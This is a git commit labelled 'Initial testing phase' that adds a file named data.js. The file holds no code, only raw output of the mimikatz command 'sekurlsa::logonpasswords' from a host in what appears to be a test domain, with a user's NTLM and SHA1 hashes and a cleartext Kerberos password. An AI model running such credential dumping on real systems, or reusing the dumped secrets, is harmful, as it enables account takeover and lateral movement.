1d2817823292e3dd3e28d16621a8bcd1548f1efe
Fawaz Al-Mutairi <q8fawazo@hotmail.com>
2021-04-25 00:08:00 +0300

    Initial testing phase

---
+++ src/Data/data.js
@@ -0,0 +1,23 @@
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 313007 (00000000:0004c6af)
+Session           : Interactive from 0
+User Name         : admin
+Domain            : W07-TEST
+SID               : S-1-5-21-259468869-2295567178-1167388315-1000
+        msv :
+         [00000003] Primary
+         * Username : admin
+         * Domain   : W07-TEST
+         * NTLM     : d79f3c68f2c83654c3cf6b44f2be5cd0
+         * SHA1     : bf49263e220f1fce85ff2dfc2d2ef05867759beb
+         [00010000] CredentialKeys
+         * NTLM     : d79f3c68f2c83654c3cf6b44f2be5cd0
+         * SHA1     : bf49263e220f1fce85ff2dfc2d2ef05867759beb
+        tspkg :
+        kerberos :
+         * Username : admin
+         * Domain   : W07-TEST
+         * Password : c8bSG3RyAEx5mS
+        ssp :
+        credman :
